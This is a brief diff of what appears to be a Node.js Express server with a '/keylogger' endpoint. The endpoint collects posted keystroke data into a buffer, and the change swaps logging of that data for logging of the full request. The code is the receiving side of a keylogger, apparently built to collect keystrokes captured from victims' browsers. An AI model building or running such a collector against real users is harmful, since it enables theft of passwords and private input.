@@ -20,7 +20,7 @@ app.get('/keylogger', (req, res)=>{
 })
 
 app.post('/keylogger', (req, res)=>{
-  console.log(req.body.data)
+  console.log(req)
   keys += req.body.data
   res.end()
 })
